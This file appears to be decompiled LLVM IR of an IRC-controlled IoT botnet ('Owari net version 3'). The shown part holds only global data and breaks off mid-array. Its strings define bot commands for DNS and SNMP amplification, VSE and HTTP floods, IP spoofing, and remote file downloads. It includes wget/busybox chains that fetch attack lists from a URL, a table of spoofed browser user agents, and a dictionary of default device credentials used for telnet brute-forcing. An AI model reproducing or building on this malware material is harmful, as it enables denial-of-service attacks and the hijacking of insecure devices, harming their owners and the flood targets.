source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r12 = internal unnamed_addr global i32 0
@r16 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r18 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4_eq = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_100400b8.12 = global i32 0
@global_var_100400c4.13 = local_unnamed_addr global i32* @global_var_100400b8.12
@global_var_10030000.14 = constant [13 x i8] c"de arguments\00"
@global_var_1004529c.17 = global i32 0
@global_var_100400bc.18 = global i32 0
@global_var_1002a054.20 = constant [8 x i8] c"POWERPC\00"
@global_var_100452b4.21 = global i32 0
@global_var_1004517c.23 = local_unnamed_addr global i32 0
@global_var_1002a05c.24 = constant [30 x i8] c"NOTICE %s :Unable to comply.\0A\00"
@global_var_10000650.25 = constant i32 939524097
@global_var_1004515c.26 = local_unnamed_addr global i32 0
@global_var_100451ac.27 = local_unnamed_addr global i32 0
@global_var_10045158.29 = local_unnamed_addr global i32 0
@global_var_1002a07c.30 = constant [63 x i8] c"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\00"
@global_var_10045170.31 = local_unnamed_addr global i32 0
@global_var_1002a0bc.32 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000d68.33 = constant [3 x i8] c"8`\00"
@global_var_1002a0d8.34 = constant [33 x i8] c"NOTICE %s :GET <host> <save as>\0A\00"
@global_var_10000f80.35 = constant [3 x i8] c"8`\00"
@global_var_10000f88.36 = constant [3 x i8] c"8`\00"
@global_var_1002a0fc.37 = constant [37 x i8] c"NOTICE %s :Unable to create socket.\0A\00"
@global_var_10000fc8.38 = constant [3 x i8] c"8`\00"
@global_var_1002a124.39 = constant [8 x i8] c"http://\00"
@global_var_1000101c.40 = constant i32 1207959584
@global_var_1000103c.41 = constant i32 939524096
@global_var_1002a12c.42 = constant [39 x i8] c"NOTICE %s :Unable to resolve address.\0A\00"
@global_var_10001114.43 = constant [3 x i8] c"8`\00"
@global_var_1000111c.44 = constant [3 x i8] c"9?\00"
@global_var_1000114c.45 = constant i32 1207959564
@global_var_1002a154.46 = constant [39 x i8] c"NOTICE %s :Unable to connect to http.\0A\00"
@global_var_100011a8.47 = constant [3 x i8] c"8`\00"
@global_var_1002a17c.48 = constant [276 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_1002a290.49 = constant [28 x i8] c"NOTICE %s :Receiving file.\0A\00"
@global_var_1002a2ac.50 = constant [3 x i8] c"wb\00"
@global_var_1002a2b0.51 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10001334.52 = constant i32 1207959588
@global_var_1002a2b8.53 = constant [24 x i8] c"NOTICE %s :Saved as %s\0A\00"
@global_var_10001498.54 = constant i32 1207959588
@global_var_100014ec.55 = constant [3 x i8] c"8`\00"
@global_var_1002a2d0.56 = constant [32 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d\0A\00"
@global_var_100015e4.57 = constant i32 1207959756
@global_var_1002a2f0.58 = constant [46 x i8] c"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\0A\00"
@global_var_1002a320.59 = constant [70 x i8] c"NOTICE %s :Owari net version: 3 by Kuze-senpai, Milenko and Morpheus\0A\00"
@global_var_1002a368.60 = constant [24 x i8] c"NOTICE %s :NICK <nick>\0A\00"
@global_var_10001770.61 = constant i32 1207959672
@global_var_1002a380.62 = constant [54 x i8] c"NOTICE %s :Nick cannot be larger than 32 characters.\0A\00"
@global_var_100017ac.63 = constant i32 1207959612
@global_var_10045178.64 = local_unnamed_addr global i32 0
@global_var_1002a3b8.65 = constant [9 x i8] c"NICK %s\0A\00"
@global_var_1002a3c4.66 = constant [16 x i8] c"NICK [%s|%s]%s\0A\00"
@global_var_1002a3d4.67 = constant [8 x i8] c"GIGANET\00"
@global_var_1002a3dc.68 = constant [27 x i8] c"NOTICE %s :DISABLE <pass>\0A\00"
@global_var_1002a3f8.69 = constant [9 x i8] c"Disabled\00"
@global_var_1002a404.70 = constant [28 x i8] c"Enabled and awaiting orders\00"
@global_var_1002a420.71 = constant [34 x i8] c"NOTICE %s :Current status is: %s\0A\00"
@global_var_100019b4.72 = constant i32 1207959752
@global_var_1002a444.73 = constant [30 x i8] c"NOTICE %s :Already disabled.\0A\00"
@global_var_100019e4.74 = constant i32 1207959704
@global_var_1002a464.75 = constant [37 x i8] c"NOTICE %s :Password too long! > 254\0A\00"
@global_var_10001a20.76 = constant i32 1207959644
@global_var_1004db50.77 = global i32 0
@global_var_1002a48c.78 = constant [31 x i8] c"NOTICE %s :Disable sucessful.\0A\00"
@global_var_1002a4ac.79 = constant [26 x i8] c"NOTICE %s :ENABLE <pass>\0A\00"
@global_var_10001b28.80 = constant i32 1207959708
@global_var_1002a4c8.81 = constant [29 x i8] c"NOTICE %s :Already enabled.\0A\00"
@global_var_10001b58.82 = constant i32 1207959660
@global_var_1002a4e8.83 = constant [27 x i8] c"NOTICE %s :Wrong password\0A\00"
@global_var_10001b9c.84 = constant i32 1207959592
@global_var_1002a504.85 = constant [30 x i8] c"NOTICE %s :Password correct.\0A\00"
@global_var_1002a524.86 = constant [31 x i8] c"NOTICE %s :Removed all spoofs\0A\00"
@global_var_1002a544.87 = constant [75 x i8] c"NOTICE %s :What kind of subnet address is that? Do something like: 169.40\0A\00"
@global_var_10001c7c.88 = constant i32 1207959964
@global_var_10045160.91 = global i32 0
@global_var_1002a594.92 = constant [33 x i8] c"NOTICE %s :Unable to resolve %s\0A\00"
@global_var_10001eb8.93 = constant [3 x i8] c"8`\00"
@global_var_100456b4.94 = global i32 0
@global_var_100456b8.95 = local_unnamed_addr global i32 0
@global_var_100456bc.96 = local_unnamed_addr global i32 0
@global_var_10040738.97 = local_unnamed_addr global i32 4095
@global_var_10040734.98 = local_unnamed_addr global i32 362436
@global_var_100024f4.99 = constant [3 x i8] c"8`\00"
@global_var_1002a5b8.100 = constant [14 x i8] c"192.168.3.100\00"
@global_var_100027f8.101 = constant i32 939524096
@global_var_1000283c.102 = constant i32 939524096
@global_var_10002c80.104 = constant i32 939524096
@global_var_10045194.105 = local_unnamed_addr global i32 0
@global_var_1002a5e8.106 = constant [67 x i8] c"NOTICE %s :DNS <IP> <port> <reflection file url> <threads> <time>\0A\00"
@global_var_1002a62c.107 = constant [171 x i8] c"wget \22%s\22 -q -O DNS.txt || busybox wget \22%s\22 -O DNS.txt || /bin/busybox wget \22%s\22 -O DNS.txt || /usr/busybox wget \22%s\22 -O DNS.txt || /var/run/busybox wget \22%s\22 -O DNS.txt\00"
@global_var_10003160.108 = constant i32 939524096
@global_var_1002a6d8.109 = constant [8 x i8] c"DNS.txt\00"
@1 = constant i32 1912602624
@global_var_1002a6e4.111 = constant [36 x i8] c"NOTICE %s :DNS amp attacking %s:%s\0A\00"
@global_var_100033b4.112 = constant [3 x i8] c"8`\00"
@global_var_1002a708.113 = constant i32 1157627971
@global_var_10003460.114 = constant [3 x i8] c"8`\00"
@global_var_1002a74c.115 = constant [13 x i8] c"192.168.1.83\00"
@global_var_100035f0.116 = constant [3 x i8] c"8`\00"
@global_var_10003718.117 = constant [3 x i8] c"8`\00"
@global_var_1000372c.118 = constant [3 x i8] c"9 \00"
@global_var_1004518c.119 = local_unnamed_addr global i32 0
@global_var_10045174.120 = local_unnamed_addr global i32 0
@global_var_100450b4.121 = local_unnamed_addr global i32 83
@global_var_1002a75c.122 = constant [99 x i8] c"NOTICE %s :SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1002a7c0.123 = constant [176 x i8] c"wget \22%s\22 -q -O SNMP.txt || busybox wget \22%s\22 -O SNMP.txt || /bin/busybox wget \22%s\22 -O SNMP.txt || /usr/busybox wget \22%s\22 -O SNMP.txt || /var/run/busybox wget \22%s\22 -O SNMP.txt\00"
@global_var_10003970.124 = constant [3 x i8] c"8`\00"
@global_var_10003984.125 = constant i32 939524096
@global_var_1002a870.126 = constant [9 x i8] c"SNMP.txt\00"
@global_var_1002a87c.127 = constant [37 x i8] c"NOTICE %s :SNMP amp attacking %s:%s\0A\00"
@global_var_10003d4c.128 = constant i32 939524096
@global_var_10003fac.129 = constant [3 x i8] c"8`\00"
@global_var_1002a8a4.130 = constant [89 x i8] c"NOTICE %s :VSE <target IP> <target port> <thread> <pps limiter, -1 for no limit> <time>\0A\00"
@global_var_1000412c.131 = constant [3 x i8] c"8`\00"
@global_var_10004178.132 = constant i32 939524096
@global_var_1002a900.133 = constant [32 x i8] c"NOTICE %s :VSE attacking %s:%s\0A\00"
@global_var_100043ac.134 = constant i32 939524096
@global_var_1002a920.135 = constant [35 x i8] c"NOTICE %s :WGETFLOOD <url> <secs>\0A\00"
@global_var_10004548.136 = constant [3 x i8] c"8`\00"
@global_var_10028db8.137 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_10028e04.138 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_10028e58.139 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_10028eb0.140 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_10028f08.141 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_10028f48.142 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_10028f90.143 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_10028fe8.144 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_10029054.145 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_100290ac.146 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_100290fc.147 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_10029120.148 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1002917c.149 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1002918c.150 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_100291bc.151 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_100291e0.152 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_10029204.153 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_10029220.154 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10029260.155 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_100292b0.156 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_100292fc.157 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_10029338.158 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_10029394.159 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_100293fc.160 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_10029470.161 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_100294e8.162 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_10029544.163 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_10029598.164 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_10029620.165 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_10029674.166 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_100296dc.167 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_10029738.168 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_10029788.169 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_100297cc.170 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_10029820.171 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_1002986c.172 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_100298b0.173 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_10029904.174 = constant [123 x i8] c"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6\00"
@global_var_10029980.175 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_100299ec.176 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_10029a5c.177 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_10029ab8.178 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_10029b2c.179 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_10029b9c.180 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_10029c34.181 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_10029c80.182 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_10029ce8.183 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_10029d24.184 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_10029d54.185 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_10029d94.186 = constant [5 x i8] c"root\00"
@global_var_10029d9c.187 = constant [6 x i8] c"admin\00"
@global_var_10029da4.188 = constant [6 x i8] c"guest\00"
@global_var_10029dac.189 = constant [8 x i8] c"default\00"
@global_var_10029db8.190 = constant [5 x i8] c"user\00"
@global_var_10029dc0.191 = constant [7 x i8] c"daemon\00"
@global_var_10029dc8.192 = constant [4 x i8] c"adm\00"
@global_var_10029dd0.193 = constant [7 x i8] c"telnet\00"
@global_var_10029dd8.194 = constant [14 x i8] c"Administrator\00"
@global_var_10029de8.195 = constant [7 x i8] c"mg3500\00"
@global_var_10029df0.196 = constant [7 x i8] c"admin1\00"
@global_var_10029df8.197 = constant [5 x i8] c"ubnt\00"
@global_var_10029e00.198 = constant [8 x i8] c"support\00"
@global_var_10029e0c.199 = constant i32 0
@global_var_10029e10.200 = constant [7 x i8] c"000000\00"
@global_var_10029e18.201 = constant [6 x i8] c"14567\00"
@global_var_10029e20.202 = constant [7 x i8] c"hi3518\00"
@global_var_10029e28.203 = constant [5 x i8] c"pass\00"
@global_var_10029e30.204 = constant [8 x i8] c"admin14\00"
@global_var_10029e3c.205 = constant [13 x i8] c"7ujMko0admin\00"
@global_var_10029e4c.206 = constant [9 x i8] c"00000000\00"
@global_var_10029e58.207 = constant [3 x i8] c"<>\00"
@global_var_10029e5c.208 = constant [5 x i8] c"klv1\00"
@global_var_10029e64.209 = constant [6 x i8] c"klv14\00"
@global_var_10029e6c.210 = constant [9 x i8] c"oelinux1\00"
@global_var_10029e78.211 = constant [8 x i8] c"realtek\00"
@global_var_10029e84.212 = constant [5 x i8] c"1111\00"
@global_var_10029e8c.213 = constant [6 x i8] c"54321\00"
@global_var_10029e94.214 = constant [7 x i8] c"antslq\00"
@global_var_10029e9c.215 = constant [8 x i8] c"zte9x15\00"
@global_var_10029ea8.216 = constant [7 x i8] c"system\00"
@global_var_10029eb0.217 = constant [5 x i8] c"1456\00"
@global_var_10029eb8.218 = constant [7 x i8] c"888888\00"
@global_var_10029ec0.219 = constant [5 x i8] c"ikwb\00"
@global_var_10029ec8.220 = constant [9 x i8] c"password\00"
@global_var_10029ed4.221 = constant [9 x i8] c"juantech\00"
@global_var_10029ee0.222 = constant [7 x i8] c"Zte521\00"
@global_var_10029ee8.223 = constant [7 x i8] c"xc3511\00"
@global_var_10029ef0.224 = constant [8 x i8] c"1111111\00"
@global_var_10029efc.225 = constant [8 x i8] c"service\00"
@global_var_10029f08.226 = constant [4 x i8] c"145\00"
@global_var_10029f10.227 = constant [5 x i8] c"4321\00"
@global_var_10029f18.228 = constant [5 x i8] c"tech\00"
@global_var_10029f20.229 = constant [5 x i8] c"abc1\00"
@global_var_10029f28.230 = constant [7 x i8] c"switch\00"
@global_var_10029f30.231 = constant [7 x i8] c"meinsm\00"
@global_var_10029f38.232 = constant [9 x i8] c"smcadmin\00"
@global_var_10029f44.233 = constant [9 x i8] c"14567890\00"
@global_var_10029f50.234 = constant [3 x i8] c"14\00"
@global_var_10029f54.235 = constant [5 x i8] c"anko\00"
@global_var_10029f5c.236 = constant [7 x i8] c"merlin\00"
@global_var_10029f64.237 = constant [6 x i8] c"zlxx.\00"
@global_var_10029f6c.238 = constant i32 973078528
@global_var_10029f70.239 = constant [4 x i8] c"ser\00"
@global_var_10029f74.240 = constant [5 x i8] c"ogin\00"
@global_var_10029f7c.241 = constant [5 x i8] c"name\00"
@global_var_10029f84.242 = constant [5 x i8] c"pass\00"
@global_var_10029f8c.243 = constant [7 x i8] c"dvrdvs\00"
@global_var_10040294.244 = global [255 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_10028db8.137, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10028e04.138, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028e58.139, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028eb0.140, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_10028f08.141, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_10028f48.142, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10028f90.143, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_10028fe8.144, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_10029054.145, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_100290ac.146, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100290fc.147, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_10029120.148, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1002917c.149, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1002918c.150, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_100291bc.151, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_100291e0.152, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_10029204.153, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_10029220.154, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_10029260.155, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_100292b0.156, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @global_var_100292fc.157, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @global_var_10029338.158, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_10029394.159, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_100293fc.160, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @global_var_10029470.161, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_100294e8.162, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_10029544.163, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @global_var_10029598.164, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10029620.165, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @global_var_10029674.166, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_100296dc.167, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_10029738.168, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_10029788.169, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_100297cc.170, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @global_var_10029820.171, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @global_var_1002986c.172, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_100298b0.173, i32 0, i32 0), i8* getelementptr inbounds ([123 x i8], [123 x i8]* @global_var_10029904.174, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @global_var_10029980.175, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_100299ec.176, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_10029a5c.177, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @global_var_10029ab8.178, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @global_var_10029b2c.179, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_10029b9c.180, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @global_var_10029c34.181, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @global_var_10029c80.182, i32 0, i32 0), i8* getelementptr inbounds ([58 x i8], [58 x i8]* @global_var_10029ce8.183, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_10029d24.184, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10029d54.185, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10029d94.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x 